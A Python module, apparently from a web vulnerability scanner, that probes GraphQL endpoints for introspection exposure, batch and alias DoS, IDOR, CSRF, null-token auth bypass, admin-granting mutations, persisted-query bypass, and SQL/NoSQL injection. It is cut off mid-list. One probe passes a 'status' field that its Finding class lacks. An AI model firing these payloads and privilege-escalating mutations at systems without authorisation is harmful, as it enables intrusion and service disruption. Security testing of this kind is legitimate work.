from __future__ import annotations
import time as _t
import json
import re
import logging
from dataclasses import dataclass
from typing import Dict, Any, List, Optional, Protocol, Tuple, Set

from .base import BaseScanner

logger = logging.getLogger(__name__)

# --- Constants ---
DEFAULT_HEADERS = {"Content-Type": "application/json"}
INTROSPECTION_MIN = {
    "query": (
        "query IntrospectionQuery { "
        "__schema { "
        "  queryType { name fields { name } } "
        "  mutationType { name fields { name } } "
        "  subscriptionType { name fields { name } } "
        "} }"
    )
}
INTROSPECTION_PING = {"query": "query { __schema { queryType { name } } }"}
FUZZ_QUERIES = [
    {"query": "query Q($n:Int!){ user(id:$n){ id name }}", "variables": {"n": 2147483647}},
    {"query": "query Q{ __typename }"},
    {"query": "mutation M($x:ID!){ updateUser(id:$x, name:\"A\"){ id }}", "variables": {"x": "not-an-id"}},
    {"query": "query Q{ nonExistingField }"},
]

# Load external payloads
try:
    from websecure.core.payloads import load_external_payloads
    _ext = load_external_payloads("graphql")
    if _ext:
        for p in _ext:
            if isinstance(p, str) and "{" in p: # Basic validation
                 FUZZ_QUERIES.append({"query": p.strip()})
except ImportError:
    pass
COMMON_GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/graph", "/gql", "/api/gql", "/v1/graphql", "/v2/graphql"]

# --- Client ---
class GraphQLClient:
    def __init__(self, session, timeout: int = 20):
        self.session = session
        self.timeout = int(timeout)

    def _maybe_json(self, text: str, headers: Dict[str, Any]) -> Dict[str, Any]:
        ct = (headers.get("Content-Type") or "").lower()
        s = (text or "").lstrip()
        if "json" in ct or s.startswith("{") or s.startswith("["):
            try:
                return json.loads(text)
            except (ValueError, TypeError) as _fix_e:
                logger.debug(f"[scanners.graphql] {type(_fix_e).__name__}: {_fix_e!r}")
        return {}

    def post(self, url: str, payload: Dict[str, Any], headers: Optional[Dict[str, str]] = None) -> Tuple[int, Dict[str, Any], str, float]:
        t0 = _t.time()
        try:
            r = self.session.post(
                url, json=payload, headers={**DEFAULT_HEADERS, **(headers or {})},
                timeout=self.timeout, allow_redirects=True
            )
            dt = _t.time() - t0
            return r.status_code, self._maybe_json(r.text, r.headers), r.text, dt
        except Exception as exc:
            logger.debug(f"[GraphQL] POST request failed for {url}: {exc!r}")
            return 0, {}, "", 0.0

    def get(self, url: str, query: str, headers: Optional[Dict[str, str]] = None) -> Tuple[int, Dict[str, Any], str, float]:
        t0 = _t.time()
        try:
            r = self.session.get(
                url, params={"query": query}, headers={"Accept": "application/json", **(headers or {})},
                timeout=self.timeout, allow_redirects=True
            )
            dt = _t.time() - t0
            return r.status_code, self._maybe_json(r.text, r.headers), r.text, dt
        except Exception as exc:
            logger.debug(f"[GraphQL] GET request failed for {url}: {exc!r}")
            return 0, {}, "", 0.0

@dataclass
class Finding:
    endpoint: str
    issue: str
    severity: str = "Medium"
    payload: Optional[Dict[str, Any]] = None
    code: Optional[int] = None
    latency: Optional[float] = None
    body_hint: Optional[str] = None

class GraphQLProbe(Protocol):
    def run(self, client: GraphQLClient, url: str) -> List[Finding]: ...

# --- Probes ---
class IntrospectionProbe:
    def run(self, client: GraphQLClient, url: str) -> List[Finding]:
        code, j, _, dt = client.post(url, INTROSPECTION_PING)
        if code == 200 and (j.get("data") or {}).get("__schema"):
            return [Finding(url, "Introspection Enabled", "Medium", INTROSPECTION_PING, code, dt)]
        # Check GET
        g_code, g_j, _, g_dt = client.get(url, INTROSPECTION_PING["query"])
        if g_code == 200 and (g_j.get("data") or {}).get("__schema"):
            return [Finding(url, "Introspection Enabled (GET)", "Medium", {"method": "GET"}, g_code, g_dt)]
        return []

class WeakValidationProbe:
    def run(self, client: GraphQLClient, url: str) -> List[Finding]:
        out = []
        for q in FUZZ_QUERIES:
            code, j, txt, dt = client.post(url, q)
            no_errors = "errors" not in (j or {})
            nonsensical_ok = bool(j.get("data")) and "nonExistingField" in q["query"]
            if code == 200 and (no_errors or nonsensical_ok):
                out.append(Finding(url, "Weak Validation", "Medium", q, code, dt))
        return out

class BatchProbe:
    def run(self, client: GraphQLClient, url: str) -> List[Finding]:
        arr_payload = [{"query": "query A { __typename }"}, {"query": "query B { __typename }"}]
        t0 = _t.time()
        try:
            r = client.session.post(url, json=arr_payload, headers=DEFAULT_HEADERS, timeout=client.timeout)
            dt = _t.time() - t0
            if r.status_code == 200 and (r.text or "").strip().startswith("["):
                return [Finding(url, "Batch Queries Supported", "Medium", {"len": len(arr_payload)}, r.status_code, dt)]
        except Exception as exc:
            logger.debug(f"[GraphQL] Batch probe request failed for {url}: {exc!r}")
        return []

class AliasProbe:
    def run(self, client: GraphQLClient, url: str) -> List[Finding]:
        aliases = " ".join([f"a{i}:__typename" for i in range(50)])
        q = {"query": f"query A {{ {aliases} }}"}
        code, j, _, dt = client.post(url, q)
        if code == 200 and "errors" not in (j or {}) and dt > 1.0:
            return [Finding(url, "Excessive Alias processing (DoS risk)", "Medium", q, code, dt)]
        return []


class FieldSuggestionProbe:
    """
    Sends intentionally misspelled field names and extracts server suggestions.
    Suggestions reveal real field/type names — information disclosure.
    Uses parse_suggestions() from the merged graphql_utils section.
    """
    _INVALID_FIELDS = [
        "userss", "profilee", "accountts", "adminnn",
        "queryy", "mutationn", "viewerr", "meee",
    ]

    def run(self, client: GraphQLClient, url: str) -> List[Finding]:
        out: List[Finding] = []
        for bad_field in self._INVALID_FIELDS:
            q = {"query": f"{{ {bad_field} }}"}
            code, j, raw, dt = client.post(url, q)
            errors = (j or {}).get("errors") or []
            combined = " ".join(str(e) for e in errors) if errors else (raw or "")
            suggestions = parse_suggestions(combined)
            if suggestions:
                out.append(Finding(
                    url, "GraphQL Field Name Suggestion Disclosure", "Low",
                    q, code, dt,
                    f"Server reveals field names via suggestions: {suggestions[:5]}",
                ))
                break  # one confirmed is sufficient
        return out


class AuthBypassProbe:
    """
    Detects GraphQL auth bypass by comparing authenticated vs. unauthenticated responses.
    If both return non-empty data, the endpoint is accessible without auth.
    """
    _ME_QUERIES = [
        {"query": "query { me { id email } }"},
        {"query": "query { viewer { id login } }"},
        {"query": "query { currentUser { id username } }"},
        {"query": "query { whoami { id name } }"},
    ]

    def run(self, client: GraphQLClient, url: str) -> List[Finding]:
        for q in self._ME_QUERIES:
            code_auth, j_auth, _, dt = client.post(url, q)
            if code_auth != 200:
                continue
            data_auth = (j_auth or {}).get("data")
            if not data_auth:
                continue
            # Re-request without auth credentials
            with _DropAuth(client.session):
                code_na, j_na, _, _ = client.post(url, q)
            data_na = (j_na or {}).get("data")
            if code_na == 200 and data_na:
                return [Finding(
                    url, "GraphQL Auth Bypass — Unauthenticated Data Access", "High",
                    q, code_na, dt,
                    f"Query returns data without auth credentials: {list(data_na.keys())[:3]}",
                )]
        return []


class IDORProbe:
    """
    Detects IDOR by fuzzing sequential object IDs.
    If the server returns different objects for sequential IDs without access control,
    that indicates broken object-level authorization.
    """
    _ID_TEMPLATES = [
        "query Q($id:ID!){{ user(id:$id){{ id email username }} }}",
        "query Q($id:Int!){{ user(id:$id){{ id name }} }}",
        "query Q($id:ID!){{ node(id:$id){{ id __typename }} }}",
        "query Q($id:ID!){{ account(id:$id){{ id username }} }}",
        "query Q($id:ID!){{ profile(id:$id){{ id displayName }} }}",
    ]
    _TEST_IDS = ["0", "1", "2", "3", "-1", "admin", "100"]

    def run(self, client: GraphQLClient, url: str) -> List[Finding]:
        for tmpl in self._ID_TEMPLATES:
            seen_data: Set[str] = set()
            for test_id in self._TEST_IDS:
                q = {"query": tmpl, "variables": {"id": test_id}}
                code, j, _, dt = client.post(url, q)
                if code != 200 or "errors" in (j or {}):
                    continue
                data = (j or {}).get("data")
                if not data:
                    continue
                fingerprint = json.dumps(data, sort_keys=True)
                if fingerprint not in seen_data:
                    seen_data.add(fingerprint)
                    if len(seen_data) > 1:
                        return [Finding(
                            url, "GraphQL IDOR — Sequential ID Object Enumeration", "High",
                            q, code, dt,
                            f"Distinct objects returned for sequential IDs (template: {tmpl[:60]}...)",
                        )]
        return []


class DepthAbuseProbe:
    """
    Sends a deeply nested query to test for missing query depth limits.
    Deep queries can cause exponential resolver work (DoS).
    """
    DEPTH = 12

    def run(self, client: GraphQLClient, url: str) -> List[Finding]:
        nested = "{ id }"
        for _ in range(self.DEPTH):
            nested = f"{{ friends {nested} }}"
        q = {"query": f"query Depth {{ user(id:\"1\") {nested} }}"}
        code, j, _, dt = client.post(url, q)
        if code == 200 and "errors" not in (j or {}):
            severity = "Medium" if dt > 2.0 else "Low"
            return [Finding(
                url, "GraphQL No Query Depth Limit Detected", severity,
                q, code, dt,
                f"Depth-{self.DEPTH} nested query accepted in {dt:.2f}s without depth error",
            )]
        return []


class DirectiveInjectionProbe:
    """
    Tests whether the server accepts unexpected or experimental directives.
    Directive injection can bypass field-level access control or cause errors.
    """
    _PAYLOADS = [
        {"query": "query { __typename @skip(if: false) }"},
        {"query": "query { __typename @include(if: true) }"},
        {"query": "{ __typename @stream }"},
        {"query": "{ __typename @defer }"},
        {"query": "{ __typename @cacheControl(maxAge: 0) }"},
    ]

    def run(self, client: GraphQLClient, url: str) -> List[Finding]:
        out: List[Finding] = []
        for q in self._PAYLOADS:
            code, j, _, dt = client.post(url, q)
            if code == 200 and (j or {}).get("data") and "errors" not in (j or {}):
                out.append(Finding(
                    url, "GraphQL Unrecognized Directive Accepted", "Low",
                    q, code, dt,
                    f"Directive accepted without error: {q['query']}",
                ))
        return out


class InfoDisclosureProbe:
    """
    Checks whether error messages reveal stack traces, internal file paths,
    SQL fragments, or other sensitive implementation details.
    """
    _TRIGGER_QUERIES = [
        {"query": "{ nonExistentField }"},
        {"query": "query { user(id: \"' OR 1=1--\") { id } }"},
        {"query": "{ __type(name: \"Query\") { fields { name args { name type { name } } } } }"},
        {"query": "mutation M { nonExistentMutation }"},
    ]
    _SENSITIVE_PATTERNS = [
        (r"(?i)traceback|stack trace|at \w+\.java:\d+", "Stack trace"),
        (r"(?i)/home/\w+|/var/www|/srv/|C:\\\\Users\\\\", "Internal file path"),
        (r"(?i)SELECT\s+\w|INSERT\s+INTO|UPDATE\s+\w+\s+SET", "SQL fragment"),
        (r"(?i)password\s*=|secret\s*=|api_key\s*=|private_key", "Credential key"),
        (r"(?i)mongodb://|mysql://|postgresql://|redis://", "Database connection string"),
    ]

    def run(self, client: GraphQLClient, url: str) -> List[Finding]:
        out: List[Finding] = []
        for q in self._TRIGGER_QUERIES:
            code, j, raw, dt = client.post(url, q)
            text = raw or ""
            for pat, label in self._SENSITIVE_PATTERNS:
                m = re.search(pat, text)
                if m:
                    snippet = text[max(0, m.start() - 40): m.end() + 40].replace("\n", " ")
                    out.append(Finding(
                        url, f"GraphQL Information Disclosure — {label}", "Medium",
                        q, code, dt,
                        f"Pattern '{label}' found in error: ...{snippet}...",
                    ))
                    break
        return out


# =============================================================================
# GraphQLBatchDoSProber — Batch amplification and alias bombing
# =============================================================================

class GraphQLBatchDoSProber(BaseScanner):
    """
    GraphQL Batch DoS via amplification and alias bombing.

    Sends 100 identical operations in a single HTTP request and measures
    response time. Also fires an alias-bomb query (100 aliases in one op).

    Severity:
    - High         if response time > 5 s (amplification possible)
    - Informational if batch accepted but response is fast
    """

    name = "graphql_batch_dos"
    phase = "offensive"

    _BATCH_SIZE = 100
    _ALIAS_COUNT = 100
    _TIMING_THRESHOLD = 5.0  # seconds

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        bucket = self.name
        self.results.setdefault(bucket, [])
        endpoints: List[str] = kwargs.get("endpoints") or [target]
        client = GraphQLClient(self.session)
        for ep in endpoints:
            self._probe_batch(client, ep, bucket)
            self._probe_alias_bomb(client, ep, bucket)
        return self.results

    def _probe_batch(self, client: GraphQLClient, url: str, bucket: str):
        batch = [{"query": "{ __typename }"}] * self._BATCH_SIZE
        t0 = _t.time()
        try:
            r = client.session.post(
                url, json=batch, headers=DEFAULT_HEADERS, timeout=30
            )
            elapsed = _t.time() - t0
            if r.status_code == 200:
                if elapsed > self._TIMING_THRESHOLD:
                    self.add(bucket, {
                        "type": "GraphQL Batch DoS — Amplification (Timing)",
                        "severity": "High",
                        "url": url,
                        "batch_size": self._BATCH_SIZE,
                        "evidence": (
                            f"{self._BATCH_SIZE}-op batch took {elapsed:.2f}s "
                            f"(threshold {self._TIMING_THRESHOLD}s) — amplification possible"
                        ),
                    })
                    logger.warning(f"[GraphQL-BatchDoS] Timing anomaly at {url}: {elapsed:.2f}s")
                elif (r.text or "").strip().startswith("["):
                    self.add(bucket, {
                        "type": "GraphQL Batch Queries Accepted (No Timing Anomaly)",
                        "severity": "Informational",
                        "url": url,
                        "batch_size": self._BATCH_SIZE,
                        "evidence": (
                            f"{self._BATCH_SIZE}-op batch accepted in {elapsed:.2f}s "
                            f"— batch is enabled but no amplification detected"
                        ),
                    })
        except Exception as exc:
            logger.debug(f"[GraphQL-BatchDoS] Batch probe failed for {url}: {exc!r}")

    def _probe_alias_bomb(self, client: GraphQLClient, url: str, bucket: str):
        aliases = " ".join([f"a{i}: __typename" for i in range(self._ALIAS_COUNT)])
        q = {"query": f"{{ {aliases} }}"}
        code, j, _, dt = client.post(url, q)
        if code == 200 and "errors" not in (j or {}):
            severity = "High" if dt > self._TIMING_THRESHOLD else "Informational"
            self.add(bucket, {
                "type": "GraphQL Alias Bombing — Excessive Alias Processing",
                "severity": severity,
                "url": url,
                "alias_count": self._ALIAS_COUNT,
                "latency_s": round(dt, 3),
                "evidence": (
                    f"{self._ALIAS_COUNT}-alias query accepted in {dt:.2f}s — "
                    + ("timing anomaly detected" if severity == "High" else "fast response")
                ),
            })
            logger.info(f"[GraphQL-BatchDoS] Alias bomb at {url}: {dt:.2f}s ({severity})")


# =============================================================================
# GraphQLMutationProber — Discover and probe sensitive mutations
# =============================================================================

class GraphQLMutationProber(BaseScanner):
    """
    Discovers available GraphQL mutations via introspection and probes
    sensitive ones for information disclosure in error responses.

    Severity:
    - Informational for any discovered mutation
    - Medium        if error responses disclose internal details
    """

    name = "graphql_mutation"
    phase = "offensive"

    _SENSITIVE_NAMES = {
        "deleteuser", "updatepassword", "createadmin", "updaterole",
        "deleteaccount", "setadmin", "promoterole", "assignrole",
        "resetpassword", "changepassword", "deleteall", "harddelete",
    }

    _INTROSPECT_MUTATIONS = {
        "query": (
            "{ __schema { mutationType { fields { name args { name type { name } } } } } }"
        )
    }

    _SENSITIVE_PATTERNS = [
        r"(?i)traceback|stack trace|at \w+\.java:\d+",
        r"(?i)/home/\w+|/var/www|/srv/",
        r"(?i)SELECT\s+\w|INSERT\s+INTO|UPDATE\s+\w+\s+SET",
        r"(?i)password\s*=|secret\s*=|api_key\s*=",
    ]

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        bucket = self.name
        self.results.setdefault(bucket, [])
        endpoints: List[str] = kwargs.get("endpoints") or [target]
        client = GraphQLClient(self.session)
        for ep in endpoints:
            self._probe(client, ep, bucket)
        return self.results

    def _probe(self, client: GraphQLClient, url: str, bucket: str):
        code, j, raw, dt = client.post(url, self._INTROSPECT_MUTATIONS)
        if code != 200 or not isinstance(j, dict):
            return

        mutation_type = ((j.get("data") or {}).get("__schema") or {}).get("mutationType")
        if not isinstance(mutation_type, dict):
            return

        fields = mutation_type.get("fields") or []
        if not fields:
            return

        for field in fields:
            name = (field.get("name") or "")
            self.add(bucket, {
                "type": "GraphQL Mutation Discovered",
                "severity": "Informational",
                "url": url,
                "mutation": name,
                "args": [a.get("name") for a in (field.get("args") or [])],
                "evidence": f"Mutation '{name}' exposed via introspection",
            })

            # Probe sensitive mutations with null/empty args
            if name.lower() in self._SENSITIVE_NAMES:
                null_vars = {a.get("name"): None for a in (field.get("args") or [])}
                probe_q = {
                    "query": f"mutation M {{ {name} }}",
                    "variables": null_vars,
                }
                p_code, p_j, p_raw, p_dt = client.post(url, probe_q)
                for pat in self._SENSITIVE_PATTERNS:
                    m = re.search(pat, p_raw or "")
                    if m:
                        snippet = (p_raw or "")[max(0, m.start() - 30): m.end() + 30]
                        self.add(bucket, {
                            "type": "GraphQL Sensitive Mutation — Error Info Disclosure",
                            "severity": "Medium",
                            "url": url,
                            "mutation": name,
                            "evidence": (
                                f"Sensitive pattern in error for mutation '{name}': "
                                f"...{snippet}..."
                            ),
                        })
                        logger.warning(
                            f"[GraphQL-Mutation] Info disclosure in mutation '{name}' at {url}"
                        )
                        break


# =============================================================================
# GraphQLCSRFProber — CSRF via form-encoded and text/plain GraphQL
# =============================================================================

class GraphQLCSRFProber(BaseScanner):
    """
    Tests whether GraphQL endpoints accept non-JSON content types,
    which enables CSRF attacks from arbitrary web origins.

    Severity:
    - High if server returns valid GraphQL data for form-encoded or text/plain body
    """

    name = "graphql_csrf"
    phase = "offensive"

    _FORM_QUERY = "query=%7B__typename%7D"        # URL-encoded: query={__typename}
    _TEXT_BODY = '{"query":"{ __typename }"}'

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        bucket = self.name
        self.results.setdefault(bucket, [])
        endpoints: List[str] = kwargs.get("endpoints") or [target]
        for ep in endpoints:
            self._probe(ep, bucket)
        return self.results

    def _probe(self, url: str, bucket: str):
        # 1. application/x-www-form-urlencoded
        try:
            r = self.session.post(
                url,
                data=self._FORM_QUERY,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=10,
            )
            body = r.text or ""
            if r.status_code == 200 and ('"data"' in body or "__typename" in body):
                if not re.search(r"(?i)content.type.*not.*supported|unsupported.*media", body):
                    self.add(bucket, {
                        "type": "GraphQL CSRF — Form-Encoded Query Accepted",
                        "severity": "High",
                        "url": url,
                        "content_type": "application/x-www-form-urlencoded",
                        "evidence": (
                            "Server returned valid GraphQL response for form-encoded request "
                            f"(no CSRF protection): {body[:200]}"
                        ),
                    })
                    logger.warning(f"[GraphQL-CSRF] Form-encoded accepted at {url}")
        except Exception as exc:
            logger.debug(f"[GraphQL-CSRF] Form-encoded probe failed for {url}: {exc!r}")

        # 2. text/plain
        try:
            r2 = self.session.post(
                url,
                data=self._TEXT_BODY,
                headers={"Content-Type": "text/plain"},
                timeout=10,
            )
            body2 = r2.text or ""
            if r2.status_code == 200 and ('"data"' in body2 or "__typename" in body2):
                if not re.search(r"(?i)content.type.*not.*supported|unsupported.*media", body2):
                    self.add(bucket, {
                        "type": "GraphQL CSRF — text/plain Query Accepted",
                        "severity": "High",
                        "url": url,
                        "content_type": "text/plain",
                        "evidence": (
                            "Server returned valid GraphQL response for text/plain request "
                            f"(no CSRF protection): {body2[:200]}"
                        ),
                    })
                    logger.warning(f"[GraphQL-CSRF] text/plain accepted at {url}")
        except Exception as exc:
            logger.debug(f"[GraphQL-CSRF] text/plain probe failed for {url}: {exc!r}")


# =============================================================================
# GraphQLAuthBypassProber — Auth bypass via null tokens and admin field injection
# =============================================================================

class GraphQLAuthBypassProber(BaseScanner):
    """
    Probes for GraphQL authentication bypass using null/invalid tokens and
    admin-privilege field injection in mutation variables.

    Severity:
    - Critical if admin mutation succeeds without valid auth
    - High     if data is returned with invalid/missing auth (auth bypass)
    - Medium   if introspection is accessible without any auth
    """

    name = "graphql_auth_bypass"
    phase = "offensive"

    _NULL_AUTH_HEADERS = [
        {"Authorization": "null"},
        {"Authorization": "Bearer null"},
        {"Authorization": "Bearer undefined"},
        {"Authorization": "Bearer "},
        {},  # no auth header at all
    ]

    _ADMIN_MUTATIONS = [
        '{"query": "mutation { createAdmin(isAdmin: true) { id } }"}',
        '{"query": "mutation { updateRole(role: \\"admin\\") { id } }"}',
    ]

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        bucket = self.name
        self.results.setdefault(bucket, [])
        endpoints: List[str] = kwargs.get("endpoints") or [target]
        client = GraphQLClient(self.session)
        for ep in endpoints:
            self._probe_introspection_no_auth(client, ep, bucket)
            self._probe_null_auth(client, ep, bucket)
            self._probe_admin_mutations(client, ep, bucket)
        return self.results

    def _probe_introspection_no_auth(self, client: GraphQLClient, url: str, bucket: str):
        """Check if __typename is accessible without any credentials."""
        with _DropAuth(client.session):
            code, j, _, dt = client.post(url, {"query": "{ __typename }"})
        if code == 200 and (j or {}).get("data"):
            self.add(bucket, {
                "type": "GraphQL Introspection Unprotected (No Auth)",
                "severity": "Medium",
                "url": url,
                "evidence": (
                    "__typename returned data without auth credentials — "
                    "introspection endpoint is publicly accessible"
                ),
                "latency_s": round(dt, 3),
            })
            logger.info(f"[GraphQL-AuthBypass] Introspection unprotected at {url}")

    def _probe_null_auth(self, client: GraphQLClient, url: str, bucket: str):
        """Try null/empty/missing auth tokens and check if data is returned."""
        query = {"query": "{ __typename }"}
        original_headers = dict(getattr(client.session, "headers", {}) or {})

        for auth_headers in self._NULL_AUTH_HEADERS:
            session_headers = getattr(client.session, "headers", None)
            if isinstance(session_headers, dict):
                # Set invalid auth
                if "Authorization" in auth_headers:
                    session_headers["Authorization"] = auth_headers["Authorization"]
                else:
                    session_headers.pop("Authorization", None)
            try:
                code, j, _, dt = client.post(url, query)
                if code == 200 and (j or {}).get("data"):
                    self.add(bucket, {
                        "type": "GraphQL Auth Bypass — Null/Missing Token Accepted",
                        "severity": "High",
                        "url": url,
                        "auth_header_used": auth_headers.get("Authorization", "<none>"),
                        "evidence": (
                            f"Server returned data with auth header "
                            f"'{auth_headers.get('Authorization', '<none>')}' — "
                            "authentication is not enforced"
                        ),
                        "latency_s": round(dt, 3),
                    })
                    logger.warning(
                        f"[GraphQL-AuthBypass] Null auth bypass at {url}: "
                        f"auth='{auth_headers.get('Authorization', '<none>')}'"
                    )
            except Exception as exc:
                logger.debug(f"[GraphQL-AuthBypass] Null auth probe failed for {url}: {exc!r}")
            finally:
                # Restore original auth
                if isinstance(session_headers, dict):
                    orig_auth = original_headers.get("Authorization")
                    if orig_auth:
                        session_headers["Authorization"] = orig_auth
                    else:
                        session_headers.pop("Authorization", None)

    def _probe_admin_mutations(self, client: GraphQLClient, url: str, bucket: str):
        """Try admin-privilege mutations with forged variables."""
        for mutation_json in self._ADMIN_MUTATIONS:
            try:
                payload = json.loads(mutation_json)
                code, j, raw, dt = client.post(url, payload)
                if code == 200 and (j or {}).get("data"):
                    self.add(bucket, {
                        "type": "GraphQL Auth Bypass — Admin Mutation Succeeded",
                        "severity": "Critical",
                        "url": url,
                        "mutation": payload.get("query", "")[:100],
                        "evidence": (
                            f"Admin mutation returned data: {raw[:200]}"
                        ),
                        "latency_s": round(dt, 3),
                    })
                    logger.warning(
                        f"[GraphQL-AuthBypass] Admin mutation succeeded at {url}"
                    )
            except Exception as exc:
                logger.debug(
                    f"[GraphQL-AuthBypass] Admin mutation probe failed for {url}: {exc!r}"
                )


# =============================================================================
# GraphQLPersistedQueryBypassProber — APQ bypass and legacy ID-based queries
# =============================================================================

class GraphQLPersistedQueryBypassProber(BaseScanner):
    """
    Probes for persisted query bypass vulnerabilities.

    Attempts APQ (Automatic Persisted Queries) with a fake hash and checks
    if the server executes the query instead of returning PersistedQueryNotFound.
    Also tries legacy numeric ID-based query formats.

    Severity:
    - Medium if server executes the query (persisted query bypass)
    """

    name = "graphql_persisted"
    phase = "offensive"

    _APQ_FAKE_HASH = "a" * 64  # 64-char fake sha256

    _APQ_PAYLOADS = [
        # Standard APQ format (Apollo)
        {
            "extensions": {
                "persistedQuery": {
                    "version": 1,
                    "sha256Hash": "a" * 64,
                }
            },
            "query": "{ __typename }",
        },
        # Hash-only (no query field) — server should reject
        {
            "extensions": {
                "persistedQuery": {
                    "version": 1,
                    "sha256Hash": "b" * 64,
                }
            },
        },
    ]

    # Legacy numeric ID formats
    _ID_PAYLOADS = [
        {"id": 1},
        {"id": "1"},
        {"queryId": "1"},
        {"queryId": 1},
        {"operationId": "1"},
    ]

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        bucket = self.name
        self.results.setdefault(bucket, [])
        endpoints: List[str] = kwargs.get("endpoints") or [target]
        client = GraphQLClient(self.session)
        for ep in endpoints:
            self._probe_apq(client, ep, bucket)
            self._probe_id_formats(client, ep, bucket)
        return self.results

    def _probe_apq(self, client: GraphQLClient, url: str, bucket: str):
        for payload in self._APQ_PAYLOADS:
            code, j, raw, dt = client.post(url, payload)
            if code != 200:
                continue
            body = raw or ""
            # Server should return PersistedQueryNotFound for unknown hash
            is_not_found = re.search(
                r"PersistedQueryNotFound|persisted.*query.*not.*found",
                body, re.I
            )
            has_data = bool((j or {}).get("data"))
            if has_data and not is_not_found:
                self.add(bucket, {
                    "type": "GraphQL Persisted Query Bypass",
                    "severity": "Medium",
                    "url": url,
                    "payload": payload,
                    "evidence": (
                        f"Server returned data for fake APQ hash "
                        f"'{self._APQ_FAKE_HASH[:16]}...' — "
                        "persisted query validation not enforced: "
                        + body[:200]
                    ),
                    "latency_s": round(dt, 3),
                })
                logger.warning(f"[GraphQL-Persisted] APQ bypass at {url}")

    def _probe_id_formats(self, client: GraphQLClient, url: str, bucket: str):
        for payload in self._ID_PAYLOADS:
            code, j, raw, dt = client.post(url, payload)
            if code == 200 and (j or {}).get("data"):
                self.add(bucket, {
                    "type": "GraphQL Legacy Query ID Format Accepted",
                    "severity": "Medium",
                    "url": url,
                    "payload": payload,
                    "evidence": (
                        f"Server returned data for legacy ID payload {payload} — "
                        f"query whitelist bypass possible: {raw[:200]}"
                    ),
                    "latency_s": round(dt, 3),
                })
                logger.warning(f"[GraphQL-Persisted] Legacy ID format accepted at {url}")


# --- GraphQL Argument Injection Probe (SQLi / NoSQLi through GraphQL arguments) ---
class GraphQLInjectionProbe:
    """
    GraphQL argument injection — query argümanlarına SQLi/NoSQLi/SSTI payload enjekte et.
    Introspection'dan field listesi alınır, her field'a payload gönderilir.
    """

    _SQL_PAYLOADS = ["' OR 1=1--", "1 OR 1=1", "' UNION SELECT 1,2,3--", "';SELECT sleep(3);--"]
    _NOSQL_PAYLOADS = ['{"$gt":""}', '{"$ne":null}', '{"$where":"1==1"}']
    _ERROR_SIGS = [
        r"SQL syntax", r"ORA-\d+", r"pg_query", r"mysql_fetch",
        r"Uncaught.*Error", r"operator does not exist",
        r"MongoError", r"BSONTypeError", r"SyntaxError.*\$",
    ]

    def run(self, client: "GraphQLClient", url: str) -> "List[Finding]":  # type: ignore[name-defined]
        import re, json

        findings: list = []

        # Discover queryable fields via introspection
        schema_query = {"query": "{ __schema { queryType { fields { name args { name type { name kind } } } } } }"}
        _, schema_j, _, _ = client.post(url, schema_query)
        fields = []
        try:
            qt = (schema_j.get("data") or {}).get("__schema", {}).get("queryType") or {}
            fields = (qt.get("fields") or [])[:10]
        except Exception:
            fields = []

        if not fields:
            # Fallback: probe with generic field names
            fields = [{"name": "user", "args": [{"name": "id", "type": {"name": "String", "kind": "SCALAR"}}]},
                      {"name": "product", "args": [{"name": "id", "type": {"name": "String", "kind": "SCALAR"}}]}]

        all_payloads = self._SQL_PAYLOADS + self._NOSQL_PAYLOADS

        for field in fields:
            fname = field.get("name", "")
            args = field.get("args") or []
            if not args:
                continue
            arg_name = args[0].get("name", "id")

            for payload in all_payloads:
                gql_query = {"query": f'{{ {fname}({arg_name}: "{payload}") {{ id }} }}'}
                code, resp_j, raw, dt = client.post(url, gql_query)
                text = raw or json.dumps(resp_j or {})

                for sig in self._ERROR_SIGS:
                    if re.search(sig, text, re.IGNORECASE):
                        findings.append(Finding(
                            endpoint=url,
                            issue=f"GraphQL Argument Injection ({fname}.{arg_name})",
                            severity="High",
                            payload=gql_query,
                            status=code,
                            latency=dt,
                            body_hint=f"Error signature: {sig} — {text[:200]}",
                        ))
                        return findings  # Stop on first confirmed

                # NoSQL: successful response with injected operator
                if code == 200 and resp_j.get("data") and "$" in payload:
                    findings.append(Finding(
                        endpoint=url,
                        issue=f"GraphQL NoSQL Injection ({fname}.{arg_name})",
                        severity="High",
                        payload=gql_query,
                        status=code,
                        latency=dt,
                        body_hint=f"Server returned data for NoSQL operator payload: {payload!r}",
                    ))
                    return findings

        return findings


# --- Main Scanner Class ---
class GraphQLScanner(BaseScanner):
    name = "graphql"

    def run(self, url: str, **kwargs) -> Dict[str, Any]:
        """
        Scans a single endpoint or discovers endpoints if url is a base URL.
        Note: The BaseScanner interface expects 'url' to be the target.
        """
        endpoints = self._discover_endpoints(url)
        bucket = self.name
        if not endpoints:
            # GraphQL endpoint KEŞFEDİLEMEDİ. Eskiden buradan `[url]` (base URL) fallback
            # vardı → hedefte GraphQL OLMASA bile 16 prober base URL'ye salınıyor, her 200
            # yanıt sahte "vuln" sayılıyordu (gerçek-hat kapısında tek başına ~180 FP).
            # Artık YALNIZ URL açıkça bir GraphQL endpoint'iyse devam et; aksi halde HİÇ
            # bulgu yok (GraphQL yoksa GraphQL bulgusu da olmaz).
            low = (url or "").lower()
            if "graphql" in low or "gql" in low:
                endpoints = [url]
            else:
                self.results[bucket] = []
                self.set_summary(bucket, 0)
                logger.debug("[GraphQL] Endpoint bulunamadı, GraphQL taraması atlandı: %s", url)
                return self.results

        self.results[bucket] = []
        
        client = GraphQLClient(self.session)
        vulns = 0

        probes = [
            IntrospectionProbe(),
            WeakValidationProbe(),
            BatchProbe(),
            AliasProbe(),
            FieldSuggestionProbe(),
            AuthBypassProbe(),
            IDORProbe(),
            DepthAbuseProbe(),
            DirectiveInjectionProbe(),
            InfoDisclosureProbe(),
            GraphQLInjectionProbe(),
        ]

        for ep in endpoints:
            for p in probes:
                for f in p.run(client, ep):
                    self.add(bucket, {
                        "url": f.endpoint,
                        "endpoint": f.endpoint,
                        "issue": f.issue,
                        "severity": f.severity,
                        "details": f.body_hint or f.issue,
                        "payload": f.payload,
                        "latency_s": round(f.latency, 3) if f.latency else None,
                    })
                    vulns += 1

        # Extended attack probers — DoS, mutations, CSRF, auth bypass, persisted query bypass
        extended_probers = [
            GraphQLBatchDoSProber(session=self.session, results=self.results),
            GraphQLMutationProber(session=self.session, results=self.results),
            GraphQLCSRFProber(session=self.session, results=self.results),
